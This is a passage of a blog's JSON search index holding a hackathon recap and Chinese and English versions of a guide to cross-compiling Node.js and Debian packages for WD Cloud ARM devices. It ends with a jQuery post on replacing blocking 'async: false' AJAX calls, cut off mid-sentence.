的「秘密」API，實際上根本不是秘密。要在活動中表現出色，如果你想贏，做好充分準備是至關重要的。 我的團隊 正如你可能注意到的，我們的團隊有一位女性成員，她是來自加拿大多倫多的年輕設計師。其他團隊成員都是開發者。我們是一個由 IT 專業人士主導的團隊，專注於交付而不是創意。 從 2 分鐘簡報中評判 每個團隊在五位評審面前進行 2 分鐘的產品演示。然後評審有一分鐘的時間向團隊提問。在我看來，大多數評審對 Mastercard 的 API 了解甚少。他們只能問一些常見和簡單的問題，例如「你使用了多少個 Mastercard API？」、「商業模式是什麼？」有時，評審甚至沒有任何問題。如果評審對 API 有更深入的了解，允許他們批判性地評估專案的可行性，那會更好。 http://angelhack.com/masteryourcard-masters-of-code-hong-kong 如果你想測試自己是否有能力創業，你應該參加這個活動。 MerchCircle 是我們當天開發的產品。 你可以在 #mastersofcode 了解更多。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"hackathon","slug":"hackathon","permalink":"https://neo01.com/tags/hackathon/"},{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-TW"},{"title":"WD Cloud 和 Node.js 的交叉編譯","slug":"2015/03/cross-building-for-wd-cloud-and-nodejs-zh-TW","date":"un66fin66","updated":"un66fin66","comments":true,"path":"/zh-TW/2015/03/cross-building-for-wd-cloud-and-nodejs/","permalink":"https://neo01.com/zh-TW/2015/03/cross-building-for-wd-cloud-and-nodejs/","excerpt":"在 Ubuntu 上為 WD Cloud ARM 裝置交叉編譯 Node.js 和其他套件的完整指南","text":"WD Cloud 在 ARM 上運行 Debian Linux。當你為其他架構建構應用程式時，你需要使用交叉編譯。我已經在 Ubuntu 14 上成功建構了一個套件，方法是遵循這篇文章，並附上一些注意事項。 如果你看到類似以下的錯誤訊息： Err http:&#x2F;&#x2F;ftp.debian.org wheezy-updates Release.gpg Could not resolve &#39;ftp.debian.org&#39; 那麼，將 /etc/resolv.conf 複製到 build/etc，例如： sudo cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc 請查看這裡以獲取 WD Cloud 韌體映像列表。 使用 Wheezy 為 WD Cloud 韌體版本 4 或更高版本進行交叉編譯的摘要 # 交叉編譯所需 apt-get install qemu-user-static apt-get install binfmt-support # 建構資料夾 mkdir wdmc-build cd wdmc-build # 下載位置可以在 http:&#x2F;&#x2F;support.wdc.com&#x2F;product&#x2F;download.asp?groupid&#x3D;904&amp;lang&#x3D;en 找到 wget http:&#x2F;&#x2F;download.wdc.com&#x2F;gpl&#x2F;gpl-source-wd_my_cloud-04.01.03-421.zip unzip gpl-source-wd_my_cloud-04.01.03-421.zip packages&#x2F;build_tools&#x2F;debian&#x2F;* mkdir 64k-wheezy cp -R packages&#x2F;build_tools&#x2F;debian&#x2F;* .&#x2F;64k-wheezy echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt; 64k-wheezy&#x2F;build.sh echo &#39;.&#x2F;build-armhf-package.sh --pagesize&#x3D;64k $1 wheezy&#39; &gt;&gt; 64k-wheezy&#x2F;build.sh chmod a+x 64k-wheezy&#x2F;build.sh cd 64k-wheezy # 設定腳本會在 chroot 期間提示輸入 root 密碼 .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build sudo mv build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static_orig sudo cp &#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static # 覆蓋 build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list # 可選，直到你需要使用 backports 套件 sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc 然後你可以透過使用套件名稱執行 build.sh 來建構，例如： .&#x2F;build.sh joe 它會從儲存庫下載原始碼套件、交叉編譯它，並建構一個 deb 檔案。這個過程可能需要超過 10 分鐘。一旦成功，你可以將 .deb 檔案 scp 到你的路由器，並使用 dpkg -i 安裝它。 手動建構 Node.js 建構 Node.js 有點棘手，因為原始碼不在儲存庫中。我曾嘗試使用來自 http://nodejs.org/dist/v0.12.0/node-v0.12.0-linux-x86.tar.gz 的二進位檔案，但失敗了，錯誤訊息為： cannot execute binary file 你可以按照腳本手動建構它： # 設定工具 .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build sudo mkdir -p build&#x2F;root&#x2F;binutils sudo tar vfx binutils&#x2F;binutils-armhf-64k.tar.gz -C build&#x2F;root&#x2F;binutils sudo chroot build &#x2F;bin&#x2F;bash cd &#x2F;root&#x2F;binutils dpkg -i binutils_*.deb dpkg -i binutils-multiarch_*.deb export DEBIAN_FRONTEND&#x3D;noninteractive export DEBCONF_NONINTERACTIVE_SEEN&#x3D;true export LC_ALL&#x3D;C export LANGUAGE&#x3D;C export LANG&#x3D;C export DEB_CFLAGS_APPEND&#x3D;&#39;-D_FILE_OFFSET_BITS&#x3D;64 -D_LARGEFILE_SOURCE&#39; export DEB_BUILD_OPTIONS&#x3D;nocheck cd &#x2F;root # 現在建構環境已準備好 wget http:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v0.12.0&#x2F;node-v0.12.0.tar.gz tar vfxz node-v0.12.0.tar.gz cd node-v0.12.0 .&#x2F;configure make # 返回原始環境 exit 二進位檔案已準備好在 build/root/node-v0.12.0/node 中，供你上傳到 WD Cloud。你可以上傳到 WD Cloud 中的 /usr/local/bin。 你還需要從 http://nodejs.org/dist/v0.12.0/node-v0.12.0-linux-x86.tar.gz 下載 npm 和其他組件。解壓縮檔案並將它們放在 /usr/local 或 /usr 中。 wget http:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v0.12.0&#x2F;node-v0.12.0-linux-x86.tar.gz tar vfxz node-v0.12.0-linux-x86.tar.gz cd node-v0.12.0-linux-x86 rm bin&#x2F;node cp -R include &#x2F;usr&#x2F;local cp -R share &#x2F;usr&#x2F;local cp -R lib &#x2F;usr&#x2F;local cp -R bin &#x2F;usr&#x2F;local 記住不要覆蓋你已上傳的二進位檔案。 套件列表 以下是我成功建構的套件列表： htop joe unrar transmission libcurl3-gnutls libminiupnpc5 libnatpmp1 transmission-common transmission-daemon Node.js 先決條件 libc-ares2 libv8 python3-pip libcurl3-gnutls python2.6 python3 python3-pkg-resources python3-setuptools python-pkg-resources python-setuptools liberror-perl（git 所需） git rrdtool（cacti 所需） virtual-mysql-client（cacti 所需） php5-mysql（cacti 所需） dbconfig-common（cacti 所需） libphp-adodb（cacti 所需） snmp（cacti 所需） php5-snmp（cacti 所需） cacti 套件已上傳到 [https://app.box.com/wdcloud](https://app.box.com/wdcloud target=_blank)。 建構腳本：","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"arm","slug":"arm","permalink":"https://neo01.com/tags/arm/"},{"name":"nodejs","slug":"nodejs","permalink":"https://neo01.com/tags/nodejs/"},{"name":"wdcloud","slug":"wdcloud","permalink":"https://neo01.com/tags/wdcloud/"}],"lang":"zh-TW"},{"title":"WD Cloud 和 Node.js 的交叉编译","slug":"2015/03/cross-building-for-wd-cloud-and-nodejs-zh-CN","date":"un66fin66","updated":"un66fin66","comments":true,"path":"/zh-CN/2015/03/cross-building-for-wd-cloud-and-nodejs/","permalink":"https://neo01.com/zh-CN/2015/03/cross-building-for-wd-cloud-and-nodejs/","excerpt":"在 Ubuntu 上为 WD Cloud ARM 设备交叉编译 Node.js 和其他包的完整指南","text":"WD Cloud 在 ARM 上运行 Debian Linux。当你为其他架构构建应用程序时，你需要使用交叉编译。我已经在 Ubuntu 14 上成功构建了一个包，方法是遵循这篇文章，并附上一些注意事项。 如果你看到类似以下的错误消息： Err http:&#x2F;&#x2F;ftp.debian.org wheezy-updates Release.gpg Could not resolve &#39;ftp.debian.org&#39; 那么，将 /etc/resolv.conf 复制到 build/etc，例如： sudo cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc 请查看这里以获取 WD Cloud 固件映像列表。 使用 Wheezy 为 WD Cloud 固件版本 4 或更高版本进行交叉编译的摘要 # 交叉编译所需 apt-get install qemu-user-static apt-get install binfmt-support # 构建文件夹 mkdir wdmc-build cd wdmc-build # 下载位置可以在 http:&#x2F;&#x2F;support.wdc.com&#x2F;product&#x2F;download.asp?groupid&#x3D;904&amp;lang&#x3D;en 找到 wget http:&#x2F;&#x2F;download.wdc.com&#x2F;gpl&#x2F;gpl-source-wd_my_cloud-04.01.03-421.zip unzip gpl-source-wd_my_cloud-04.01.03-421.zip packages&#x2F;build_tools&#x2F;debian&#x2F;* mkdir 64k-wheezy cp -R packages&#x2F;build_tools&#x2F;debian&#x2F;* .&#x2F;64k-wheezy echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt; 64k-wheezy&#x2F;build.sh echo &#39;.&#x2F;build-armhf-package.sh --pagesize&#x3D;64k $1 wheezy&#39; &gt;&gt; 64k-wheezy&#x2F;build.sh chmod a+x 64k-wheezy&#x2F;build.sh cd 64k-wheezy # 设置脚本会在 chroot 期间提示输入 root 密码 .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build sudo mv build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static_orig sudo cp &#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static # 覆盖 build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list # 可选，直到你需要使用 backports 包 sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc 然后你可以通过使用包名称执行 build.sh 来构建，例如： .&#x2F;build.sh joe 它会从存储库下载源代码包、交叉编译它，并构建一个 deb 文件。这个过程可能需要超过 10 分钟。一旦成功，你可以将 .deb 文件 scp 到你的路由器，并使用 dpkg -i 安装它。 手动构建 Node.js 构建 Node.js 有点棘手，因为源代码不在存储库中。我曾尝试使用来自 http://nodejs.org/dist/v0.12.0/node-v0.12.0-linux-x86.tar.gz 的二进制文件，但失败了，错误消息为： cannot execute binary file 你可以按照脚本手动构建它： # 设置工具 .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build sudo mkdir -p build&#x2F;root&#x2F;binutils sudo tar vfx binutils&#x2F;binutils-armhf-64k.tar.gz -C build&#x2F;root&#x2F;binutils sudo chroot build &#x2F;bin&#x2F;bash cd &#x2F;root&#x2F;binutils dpkg -i binutils_*.deb dpkg -i binutils-multiarch_*.deb export DEBIAN_FRONTEND&#x3D;noninteractive export DEBCONF_NONINTERACTIVE_SEEN&#x3D;true export LC_ALL&#x3D;C export LANGUAGE&#x3D;C export LANG&#x3D;C export DEB_CFLAGS_APPEND&#x3D;&#39;-D_FILE_OFFSET_BITS&#x3D;64 -D_LARGEFILE_SOURCE&#39; export DEB_BUILD_OPTIONS&#x3D;nocheck cd &#x2F;root # 现在构建环境已准备好 wget http:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v0.12.0&#x2F;node-v0.12.0.tar.gz tar vfxz node-v0.12.0.tar.gz cd node-v0.12.0 .&#x2F;configure make # 返回原始环境 exit 二进制文件已准备好在 build/root/node-v0.12.0/node 中，供你上传到 WD Cloud。你可以上传到 WD Cloud 中的 /usr/local/bin。 你还需要从 http://nodejs.org/dist/v0.12.0/node-v0.12.0-linux-x86.tar.gz 下载 npm 和其他组件。解压缩文件并将它们放在 /usr/local 或 /usr 中。 wget http:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v0.12.0&#x2F;node-v0.12.0-linux-x86.tar.gz tar vfxz node-v0.12.0-linux-x86.tar.gz cd node-v0.12.0-linux-x86 rm bin&#x2F;node cp -R include &#x2F;usr&#x2F;local cp -R share &#x2F;usr&#x2F;local cp -R lib &#x2F;usr&#x2F;local cp -R bin &#x2F;usr&#x2F;local 记住不要覆盖你已上传的二进制文件。 包列表 以下是我成功构建的包列表： htop joe unrar transmission libcurl3-gnutls libminiupnpc5 libnatpmp1 transmission-common transmission-daemon Node.js 先决条件 libc-ares2 libv8 python3-pip libcurl3-gnutls python2.6 python3 python3-pkg-resources python3-setuptools python-pkg-resources python-setuptools liberror-perl（git 所需） git rrdtool（cacti 所需） virtual-mysql-client（cacti 所需） php5-mysql（cacti 所需） dbconfig-common（cacti 所需） libphp-adodb（cacti 所需） snmp（cacti 所需） php5-snmp（cacti 所需） cacti 包已上传到 [https://app.box.com/wdcloud](https://app.box.com/wdcloud target=_blank)。 构建脚本：","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"arm","slug":"arm","permalink":"https://neo01.com/tags/arm/"},{"name":"nodejs","slug":"nodejs","permalink":"https://neo01.com/tags/nodejs/"},{"name":"wdcloud","slug":"wdcloud","permalink":"https://neo01.com/tags/wdcloud/"}],"lang":"zh-CN"},{"title":"Cross-Building for WD Cloud and Node.js","slug":"2015/03/cross-building-for-wd-cloud-and-nodejs","date":"un66fin66","updated":"un66fin66","comments":true,"path":"2015/03/cross-building-for-wd-cloud-and-nodejs/","permalink":"https://neo01.com/2015/03/cross-building-for-wd-cloud-and-nodejs/","excerpt":"Complete guide to cross-compiling Node.js and packages for WD Cloud ARM devices on Ubuntu, with ready-to-use build scripts.","text":"WD Cloud runs Debian Linux on ARM. When you build applications for other architectures, you need to use cross-building. I have successfully built a package on Ubuntu 14 by following this post with a few notes. If you see an error message like: Err http:&#x2F;&#x2F;ftp.debian.org wheezy-updates Release.gpg Could not resolve &#39;ftp.debian.org&#39; Then, copy /etc/resolv.conf into build/etc, e.g., sudo cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc Please check here for a list of WD Cloud firmware images. Summary of Cross-Building with Wheezy for WD Cloud Firmware Version 4 or Above # required for cross-building apt-get install qemu-user-static apt-get install binfmt-support # folder for building mkdir wdmc-build cd wdmc-build # download location can be found in http:&#x2F;&#x2F;support.wdc.com&#x2F;product&#x2F;download.asp?groupid&#x3D;904&amp;lang&#x3D;en wget http:&#x2F;&#x2F;download.wdc.com&#x2F;gpl&#x2F;gpl-source-wd_my_cloud-04.01.03-421.zip unzip gpl-source-wd_my_cloud-04.01.03-421.zip packages&#x2F;build_tools&#x2F;debian&#x2F;* mkdir 64k-wheezy cp -R packages&#x2F;build_tools&#x2F;debian&#x2F;* .&#x2F;64k-wheezy echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt; 64k-wheezy&#x2F;build.sh echo &#39;.&#x2F;build-armhf-package.sh --pagesize&#x3D;64k $1 wheezy&#39; &gt;&gt; 64k-wheezy&#x2F;build.sh chmod a+x 64k-wheezy&#x2F;build.sh cd 64k-wheezy # the setup script will prompt for root password during chroot .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build sudo mv build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static_orig sudo cp &#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static # override build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list # optional until you need to use backports packages sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list sudo cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc Then you can build by running build.sh with the package name, e.g., .&#x2F;build.sh joe It will download the source package from the repository, cross-compile it, and build a deb file. The process could take over 10 minutes. Once it is successful, you can scp the .deb file to your router and install it with dpkg -i. Building Node.js Manually It is a little tricky to build Node.js because the source is not in the repository. I have tried to use a binary from http://nodejs.org/dist/v0.12.0/node-v0.12.0-linux-x86.tar.gz, but it failed with: cannot execute binary file You can follow the scripts to build it manually: # setup utils .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build sudo mkdir -p build&#x2F;root&#x2F;binutils sudo tar vfx binutils&#x2F;binutils-armhf-64k.tar.gz -C build&#x2F;root&#x2F;binutils sudo chroot build &#x2F;bin&#x2F;bash cd &#x2F;root&#x2F;binutils dpkg -i binutils_*.deb dpkg -i binutils-multiarch_*.deb export DEBIAN_FRONTEND&#x3D;noninteractive export DEBCONF_NONINTERACTIVE_SEEN&#x3D;true export LC_ALL&#x3D;C export LANGUAGE&#x3D;C export LANG&#x3D;C export DEB_CFLAGS_APPEND&#x3D;&#39;-D_FILE_OFFSET_BITS&#x3D;64 -D_LARGEFILE_SOURCE&#39; export DEB_BUILD_OPTIONS&#x3D;nocheck cd &#x2F;root # now the build environment is ready wget http:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v0.12.0&#x2F;node-v0.12.0.tar.gz tar vfxz node-v0.12.0.tar.gz cd node-v0.12.0 .&#x2F;configure make # go back to original environment exit The binary is ready in build/root/node-v0.12.0/node for you to upload to the WD Cloud. You can upload to /usr/local/bin in your WD Cloud. You also need to download npm and other components from http://nodejs.org/dist/v0.12.0/node-v0.12.0-linux-x86.tar.gz. Extract the files and put them in either /usr/local or /usr. wget http:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v0.12.0&#x2F;node-v0.12.0-linux-x86.tar.gz tar vfxz node-v0.12.0-linux-x86.tar.gz cd node-v0.12.0-linux-x86 rm bin&#x2F;node cp -R include &#x2F;usr&#x2F;local cp -R share &#x2F;usr&#x2F;local cp -R lib &#x2F;usr&#x2F;local cp -R bin &#x2F;usr&#x2F;local Remember not to override the binary you have uploaded. Package List Below is a list of packages I have successfully built: htop joe unrar transmission libcurl3-gnutls libminiupnpc5 libnatpmp1 transmission-common transmission-daemon Node.js prerequisites libc-ares2 libv8 python3-pip libcurl3-gnutls python2.6 python3 python3-pkg-resources python3-setuptools python-pkg-resources python-setuptools liberror-perl (required for git) git rrdtool (required for cacti) virtual-mysql-client (required for cacti) php5-mysql (required for cacti) dbconfig-common (required for cacti) libphp-adodb (required for cacti) snmp (required for cacti) php5-snmp (required for cacti) cacti Packages are uploaded to [https://app.box.com/wdcloud](https://app.box.com/wdcloud target=_blank). Script to build:","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"arm","slug":"arm","permalink":"https://neo01.com/tags/arm/"},{"name":"nodejs","slug":"nodejs","permalink":"https://neo01.com/tags/nodejs/"},{"name":"wdcloud","slug":"wdcloud","permalink":"https://neo01.com/tags/wdcloud/"}]},{"title":"重写阻塞式 AJAX（JQuery 中的 async: false）","slug":"2014/12/rewriting-blocking-ajax-async-false-in-jquery-zh-CN","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-CN/2014/12/rewriting-blocking-ajax-async-false-in-jquery/","permalink":"https://neo01.com/zh-CN/2014/12/rewriting-blocking-ajax-async-false-in-jquery/","excerpt":"学习如何将阻塞式 AJAX 调用重写为异步模式。消除 async: false 和全局变量的反模式。","text":"当我应用 Jasmine Ajax 来测试一段 JavaScript 时，我卡住了，我发现原因是 Jasmine Ajax 不支持阻塞式 AJAX 调用。我不怪 Jasmine Ajax，因为我认为进行阻塞式 AJAX 调用根本没有意义。 几乎所有开发人员都认为 AJAX 是代表异步（Asynchronous）的缩写。然而，AJAX 的世界对一些新学习者来说可能很复杂，看到带有阻塞的 AJAX 调用并不罕见。在大多数网页、移动和服务器平台上，阻塞式 AJAX 调用被认为是不良实践。原因因平台而略有不同，但总体而言，JavaScript 是单线程的，任何阻塞调用都意味着功能停止。 以下是使用 async: false 进行阻塞的 jQuery AJAX 调用示例（以及另一个反模式，使用全局变量）， var someGlobal &#x3D; false; $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#x2F;&#x2F;somewhere&quot;, contentType: &quot;application&#x2F;json; charset&#x3D;utf-8&quot;, async: false, success: (function() &#123; someGlobal &#x3D; true; &#125;) &#125;); if (someGlobal) &#123; &#x2F;&#x2F; follow-up &#125; 上面的示例在某种意义上很容易理解，因为它逐步执行。someGlobal 的值在后续处理之前被正确赋值。除了阻塞和使用全局变量外，一切都很好。让我们重写这个并看看。 $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#x2F;&#x2F;somewhere&quot;, contentType: &quot;application&#x2F;json; charset&#x3D;utf-8&quot;, async:true, success: (function() &#123; followUp(true); &#125;), error: (function() &#123; followUp(false); &#125;) &#125;); &#x2F;&#x2F; parameter result is renamed from someGlobal function followUp(result) &#123; &#x2F;&#x2F; follow-up &#125; 现在，由于 async: true 设置，AJAX 请求不会被阻塞。我们将后续处理的代码放入一个单独的 followUp 函数中。不需要全局变量。在现实世界中，这可能成为回调链的一部分，我们稍后会讨论。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"jasmine","slug":"jasmine","permalink":"https://neo01.com/tags/jasmine/"},{"name":"javascript","slug":"javascript","permalink":"https://neo01.com/tags/javascript/"}],"lang":"zh-CN"},{"title":"重寫阻塞式 AJAX（JQuery 中的 async: false）","slug":"2014/12/rewriting-blocking-ajax-async-false-in-jquery-zh-TW","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-TW/2014/12/rewriting-blocking-ajax-async-false-in-jquery/","permalink":"https://neo01.com/zh-TW/2014/12/rewriting-blocking-ajax-async-false-in-jquery/","excerpt":"學習如何將阻塞式 AJAX 呼叫重寫為非同步模式。消除 async: false 和全域變數的反模式。","text":"當我應用 Jasmine Ajax 來測試一段 JavaScript 時，我卡住了，我發現原因是 Jasmine Ajax 不支援阻塞式 AJAX 呼叫。我不怪 Jasmine Ajax，因為我認為進行阻塞式 AJAX 呼叫根本沒有意義。 幾乎所有開發人員都認為 AJAX 是代表非同步（Asynchronous）的縮寫。然而，AJAX 的世界對一些新學習者來說可能很複雜，看到帶有阻塞的 AJAX 呼叫並不罕見。在大多數網頁、行動和伺服器平台上，阻塞式 AJAX 呼叫被認為是不良實踐。原因因平台而略有不同，但總體而言，JavaScript 是單執行緒的，任何阻塞呼叫都意味著功能停止。 以下是使用 async: false 進行阻塞的 jQuery AJAX 呼叫範例（以及另一個反模式，使用全域變數）， var someGlobal &#x3D; false; $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#x2F;&#x2F;somewhere&quot;, contentType: &quot;application&#x2F;json; charset&#x3D;utf-8&quot;, async: false, success: (function() &#123; someGlobal &#x3D; true; &#125;) &#125;); if (someGlobal) &#123; &#x2F;&#x2F; follow-up &#125; 上面的範例在某種意義上很容易理解，因為它逐步執行。someGlobal 的值在後續處理之前被正確賦值。除了阻塞和使用全域變數外，一切都很好。讓我們重寫這個並看看。 $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#x2F;&#x2F;somewhere&quot;, contentType: &quot;application&#x2F;json; charset&#x3D;utf-8&quot;, async:true, success: (function() &#123; followUp(true); &#125;), error: (function() &#123; followUp(false); &#125;) &#125;); &#x2F;&#x2F; parameter result is renamed from someGlobal function followUp(result) &#123; &#x2F;&#x2F; follow-up &#125; 現在，由於 async: true 設定，AJAX 請求不會被阻塞。我們將後續處理的程式碼放入一個單獨的 followUp 函式中。不需要全域變數。在現實世界中，這可能成為回呼鏈的一部分，我們稍後會討論。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"jasmine","slug":"jasmine","permalink":"https://neo01.com/tags/jasmine/"},{"name":"javascript","slug":"javascript","permalink":"https://neo01.com/tags/javascript/"}],"lang":"zh-TW"},{"title":"Rewriting blocking AJAX (async: false in JQuery)","slug":"2014/12/rewriting-blocking-ajax-async-false-in-jquery","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2014/12/rewriting-blocking-ajax-async-false-in-jquery/","permalink":"https://neo01.com/2014/12/rewriting-blocking-ajax-async-false-in-jquery/","excerpt":"Learn how to rewrite blocking AJAX calls to async mode. Eliminate the anti-patterns of async: false and global variables in your JavaScript code.","text":"When I applied Jasmine Ajax to test a piece of JavaScript, I was stuck, and I discovered that the cause was no support for blocking AJAX calls from Jasmine Ajax. I don’t blame Jasmine Ajax because I don’t think making blocking AJAX calls makes sense at all. Almost all developers consider AJAX to be an acronym standing for Asynchronous. However, the world of AJAX can be complicated to some new learners, and it’s not uncommon to see AJAX calls with blocking. Blocking AJAX calls are considered a poor practice in most web, mobile, and server platforms. The reasons differ slightly by platform, but overall, JavaScripts are single-threaded, and any blocking call means cessation of function. Below is an example of a jQuery AJAX call with blocking using async: false (and another anti-pattern, using global variables), var someGlobal &#x3D; false; $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#x2F;&#x2F;somewhere&quot;, contentType: &quot;application&#x2F;json; charset&#x3D;utf-8&quot;, async: false, success: (function() &#123; someGlobal &#x3D; true; &#125;) &#125;); if (someGlobal) &#123; &#x2F;&#x2F; follow-up &#125; The above example is easy to follow in some sense because it runs step-by-step. The value of someGlobal is properly assigned before following up. Everything is fine except for the blocking and use of a global variable. Let’s rewrite this and see. $.ajax(&#123; type: &quot;GET&quot;, url: &quot;&#x2F;&#x2F;somewhere&quot;, contentType: &quot;application&#x2F;json; charset&#x3D;utf-8&quot;, async:true, success: (function() &#123; followUp(true); &#125;), error: (function() &#123; followUp(false); &#125;) &#125;); &#x2F;&#x2F; parameter result is renamed from someGlobal function followUp(result) &#123; &#x2F;&#x2F; follow-up &#125; Now, the AJAX request is not blocked due to the async: true 